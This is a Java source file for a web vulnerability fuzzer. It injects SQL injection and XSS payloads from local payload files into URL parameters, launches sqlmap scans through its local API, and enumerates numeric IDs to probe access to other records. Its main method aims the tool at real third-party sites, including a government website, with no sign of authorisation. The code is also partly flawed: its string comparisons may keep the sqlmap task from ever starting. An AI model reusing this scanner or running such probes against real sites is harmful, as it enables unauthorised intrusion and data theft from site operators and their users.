package com.Proxy;

import java.awt.Dialog.ModalExclusionType;
import java.io.IOException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.security.MessageDigest;
import java.security.Policy.Parameters;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;
import org.json.JSONObject;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class Fuzzer {
	String targetUrl = null;
	String targetParam = null;
	String xxxx = "++++++++++++++++++++++";
	public Fuzzer(String targetUrl,String targetParam){
		this.targetUrl = targetUrl;
		this.targetParam = targetParam;
	}
	
	public int GetParamNumbuer(String str){
		Pattern p = Pattern.compile("=");
		Matcher m = p.matcher(str);
		int conut = 0;
		while(m.find()){
			conut++;
		}
		return conut;
	}
	
	/*
	public String fuzzing(){
		String result = null;
		String param = null;
		String path = "C:\\Users\\zht\\workspace\\Proxy\\payloads\\sqli.txt";
		String logpath = "C:\\Users\\zht\\workspace\\Proxy\\log\\sqli.txt";
		 
		ArrayList PayLoad = new ArrayList();
		httpTool http =new httpTool();
		ReadFromFile ReadPayload = new ReadFromFile();
		AppendToFile log = new AppendToFile();
		try{
			targetUrl = URLDecoder.decode(targetUrl,"UTF-8");
			
			PayLoad = ReadPayload.readFileByLines(path);
			int numofpy = PayLoad.size();
			Pattern p = Pattern.compile("=([^&]*)(&|$)");
			Matcher m = p.matcher(targetUrl);
			while(m.find()){
				System.out.print(m.group());
				for(int i = 0;i < numofpy;i++){
					String readUrl = targetUrl;
					String realparam = m.group().substring(1,m.group().length()-1);
					readUrl = readUrl.replace(realparam, URLEncoder.encode(realparam +(String)PayLoad.get(i),"utf-8"));
					result = http.sendGet(readUrl, param);
					log.appendMethodA(logpath, readUrl);
					log.appendMethodA(logpath,result);
					log.appendMethodA(logpath, xxxx);
					System.out.println(result);
				}
			}		
		}catch(Exception e){
			e.printStackTrace();
		}
		return result;
	}
	*/
	
	public String Sqlfuzzingwithsqlmap(String type, RequestPackage pack){
		String result = null;
		JSONObject back = new JSONObject();
		AppendToFile log = new AppendToFile();
		String success = null;
		String taskid = null;
		String urlTonew = "http://127.0.0.1:8775/task/new";
		String urlTostart = "http://127.0.0.1:8775/scan/xxoo/start";
		String urlTolog = "http://127.0.0.1:8775/scan/xxoo/log";
		String startParam = "{\"url\":\"xxoo\"}";
		String target = targetUrl + targetParam;
		
		httpTool http = new httpTool();
		try {
			//start the sqlmapapi
			/*
			Runtime runtime = Runtime.getRuntime();
			try {
				runtime.exec("cmd /c start python D:\\study\\yanjiu\\sourse\\sqlmapproject-sqlmap-a219ff9\\sqlmapapi.py -s -H 0.0.0.0");
			} catch (Exception e) {
				System.err.println("Error!");
			}
			*/
			//to new a scan
			result = http.sendGetOrign(urlTonew, "");
			//System.out.println("the result of new:" + result);
			back = new JSONObject(result);
			if(back.getString("success") == "true"){
				taskid = back.getString("taskid");
			}
			urlTostart = urlTostart.replace("xxoo", taskid);
			startParam = startParam.replace("xxoo", target);
			System.out.println(startParam);
			result = http.sendPosttoSqlmap(urlTostart, startParam);
			
			try{
		        //Thread.sleep(100000);
				Thread.sleep(100);
		    }catch(InterruptedException e){
		    	  e.printStackTrace();
		    } 
			
			startParam = "{\"url\":\"xxoo\"}";
			System.out.println("the result of start:" + result);
			back = new JSONObject(result);
			if(back.getString("success") == "true"){
				urlTolog = urlTolog.replace("xxoo", taskid);
				result = http.sendGetOrign(urlTolog, "");
				System.out.println("the log of this scan is:" + result);
				back = new JSONObject(result);
				JSONArray logArray = back.getJSONArray("log");
				result = taskid;
				
				//log.appendMethodA("sqlmap_result.txt", target);
				for(int i = 0; i < logArray.length(); i++){
					System.out.println("im in the circle" + i);
					JSONObject content = (JSONObject)logArray.get(i);
					String mesesge = content.getString("message");
					String level = content.getString("level");
					String time = content.getString("time");
					if(mesesge.contains("")){
						log.appendMethodA("sqlmap_log.txt", mesesge);
					}
					System.out.println("message:" + mesesge + " " + "level:" + level + " " + "time:" + time + "\n"  );
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}
	
	//fuzzing with the url to identerity the xss
	public String Xssfuzzing(String type,RequestPackage pack){
		String result = null;
		String path = "C:\\Users\\zht\\workspace\\Proxy\\payloads\\xss_test.txt";     //payload
		String pathxss ="C:\\Users\\zht\\workspace\\Proxy\\log\\xss.txt";
		
		ArrayList payLoad = new ArrayList();
		httpTool http = new httpTool();
		ReadFromFile readPayload = new ReadFromFile();
		AppendToFile log = new AppendToFile();
		Levenshtein leven = new Levenshtein();
		
		try{
			payLoad = readPayload.readFileByLines(path);
			
			int numofpy = payLoad.size();
			Pattern p = Pattern.compile("=([^&]*)(&|$)");
			Matcher m = p.matcher(targetParam);
			while(m.find()){
				System.out.println("the args is:" + m.group());
				for(int i = 0; i < numofpy; i++){
					//add the payload for every args
					String readparam = targetParam;
					String realparam = null;
					if(m.group().contains("&")){
						realparam = m.group().substring(1,m.group().length()-1);
						readparam = readparam.replace(realparam, URLEncoder.encode(realparam + payLoad.get(i).toString(),"utf-8"));
					}else{
						realparam = targetParam;
						readparam = readparam + payLoad.get(i).toString();
					}
					
					if(type.contains("GET")){
						//result = http.sendGet(targetUrl, readparam, pack);
						String url = targetUrl + readparam;
						System.out.println(url);
						Document doc = Jsoup.connect(url).get();
						//System.out.println(doc);
						if(doc.toString().contains("xss")){
							System.out.println("oh shit,you get a xss");
							log.appendMethodA("log_xss.txt", targetUrl + targetParam);
						}
					}else{
						System.out.println("Post here");
						log.appendMethodA(pathxss, targetUrl + targetParam);
					}
				}
			}
		}catch(Exception e){
			e.printStackTrace();
		}
		return result;
	}
		
//fuzzing with url to identerty the sqlinjecting
	public String Sqlfuzzingwithpackage(String type,RequestPackage pack){
		String result = null;
		String param = null;
		String path = "C:\\Users\\zht\\workspace\\Proxy\\payloads\\sqli.txt";
		String logpath = "C:\\Users\\zht\\workspace\\Proxy\\log\\sqli.txt";
		 
		ArrayList PayLoad = new ArrayList();
		httpTool http =new httpTool();
		ReadFromFile ReadPayload = new ReadFromFile();
		AppendToFile log = new AppendToFile();
		Levenshtein leven = new Levenshtein();
		try{
			targetUrl = URLDecoder.decode(targetUrl,"UTF-8");
			String real = null;
			if(type.contentEquals("GET")){
				real = http.sendGet(targetUrl, targetParam, pack);
			}else{
				real = http.sendPost(targetUrl, targetParam, pack);
			}
			
			PayLoad = ReadPayload.readFileByLines(path);
			int numofpy = PayLoad.size();
			Pattern p = Pattern.compile("=([^&]*)(&|$)");
			Matcher m = p.matcher(targetParam);
			while(m.find()){
				System.out.print(m.group());
				System.out.println("+++++++");
				
				for(int i = 0;i < numofpy;i++){
					String readparam = targetParam;
					String realparam = null;
					if(m.group().contains("&")){
						realparam = m.group().substring(1,m.group().length()-1);
						readparam = readparam.replace(realparam, URLEncoder.encode(realparam +(String)PayLoad.get(i),"utf-8"));
					}else{
						realparam = targetParam;
						readparam = readparam + (String)PayLoad.get(i);
					}
					//String realparam = m.group().substring(1,m.group().length()-1);
					
					if(type.contentEquals("GET")){
						result = http.sendGet(targetUrl, readparam, pack);
						float similar = leven.getSimilarityRatio(result, real);
						float lengthsimilar = leven.getSimilarityLength(result, real);
						float wrongsimilar = leven.getSimilarityWrong(result);
						System.out.println("the similarityRatio is:" + similar);
						System.out.println("the lengthsimilar is:" + lengthsimilar);
						System.out.println("the wrongsimilar is:" + wrongsimilar);
					}else {
						result = http.sendPost(targetUrl, readparam, pack);
					}
					log.appendMethodA(logpath, readparam);
					log.appendMethodA(logpath,result);
					log.appendMethodA(logpath, xxxx);
					System.out.println(result);
				}
				
			}		
		}catch(Exception e){
			e.printStackTrace();
		}
		return result;
	}
	
	public String Yewufuzzingwithpackage(String flag,RequestPackage pack){
		String result = null;
		String param = null;
		String logpath = "C:\\Users\\zht\\workspace\\Proxy\\log\\sqli.txt";
		
		//System.out.println("im fuzzing +++++++++++++++++++++++++++++++++++++++++++++++++++" + pack.getPacket_url());
		Levenshtein leve = new Levenshtein();
		ArrayList PayLoad = new ArrayList();
		httpTool http =new httpTool();
		ReadFromFile ReadPayload = new ReadFromFile();
		AppendToFile log = new AppendToFile();
		try{
			targetUrl = URLDecoder.decode(targetUrl,"UTF-8");
	        String real = null;
	        if(flag.contentEquals("GET")){
				real = http.sendGet(targetUrl, targetParam,pack);
				System.out.println(result);
			}else {
				real = http.sendPost(targetUrl, targetParam,pack);
			}
			Pattern p = Pattern.compile("=([^&]*)(&|$)");
			Matcher m = p.matcher(targetParam);
			while(m.find()){
				System.out.print(m.group() + "+++++");
				String realparam = null;
				if(m.group().endsWith("&")){
					realparam = m.group().substring(1,m.group().length()-1);
				}else{
					realparam = m.group().substring(1,m.group().length());
				}
				Pattern num = Pattern.compile("[0-9]*");
				Matcher m1 = num.matcher(realparam);
				//System.out.println("the progrom is )))))))))))))))))))))" + realparam);
				
				if(m1.matches()){
					//System.out.println(m1.group() + "++++++++++++++++++");
					String dd = m1.group();
					if(dd == null||dd.isEmpty()){
						continue;
					}else {
						//System.out.println(m1.group() + "--------------------");
						int j = Integer.parseInt(m1.group());                //
						for(int i = Integer.parseInt(m1.group());i < j + 10;i++){
							String readparam = targetParam;
							String id = String.valueOf(i);
							readparam = readparam.replace(realparam, URLEncoder.encode(id,"utf-8"));
							if(flag.contentEquals("GET")){
								result = http.sendGet(targetUrl, readparam,pack);
								System.out.println(result);
								float similar = leve.getSimilarityRatio(result, real);
								float lenghtsimilar = leve.getSimilarityLength(result, real);
								System.out.println("the similarityradio is:" + similar);
								System.out.println("the similaritylength is:" + lenghtsimilar);
								
							}else {
								result = http.sendPost(targetUrl, readparam,pack);
							}
							log.appendMethodA(logpath, targetUrl + readparam);
							log.appendMethodA(logpath, result);
							log.appendMethodA(logpath, this.xxxx);	
						}
					}
		
				}	
	
			}		
		}catch(Exception e){
			e.printStackTrace();
		}
		return result;
	}
	
	
	public void Yewufuzzingwithurl(){
		
	}
	
	public static boolean isNumeric(String str){  
	    Pattern pattern = Pattern.compile("[0-9]*");  
	    return pattern.matcher(str).matches();     
	}
	
	public static void main(String[] args)throws IOException{
		//String targetUrl = "http://125.35.6.41/eucdwan/ApplyServlet?method=readApplyFileData&applyId=f3e2cebe-e4ae-493d-a326-24a4ae90e0c0";
		
		//String targetUrl = "http://125.35.6.41/eucdwan/ApplyServlet?"; 
		//String targetParam = "method=readApplyFileData&applyId=f3e2cebe-e4ae-493d-a326-24a4ae90e0c0";
		//String targetParam = "method=readApplyFileData&applyId=5123";
		
		//String targetUrl = "http://m.app.mi.com/searchapi?";    //sql
		//String targetParam = "keywords=weixin&pageSize=2";
		
		//String targetUrl = "http://www.cpa.org.cn//?";            //sql
		//String targetParam = "do=so&key=2015";
		
		String targetUrl = "http://www.ahty.gov.cn/jyjc.jsp?";            //sql
		String targetParam = "gbookId=54";
		Fuzzer fuzzer = new Fuzzer(targetUrl,targetParam);
		//fuzzer.Xssfuzzing("GET", null);
		String resutl = fuzzer.Sqlfuzzingwithsqlmap("GET", null);
		System.out.println(resutl);
		
		
 		//fuzzer.Yewufuzzing("GET",null);
		//fuzzer.Sqlfuzzingwithpackage("GET",null);
		
		/*
		if(fuzzer.isNumeric("3245")){
			System.out.println("it is num");
		}else{
			System.out.println("not num");
		}*/
	}
}
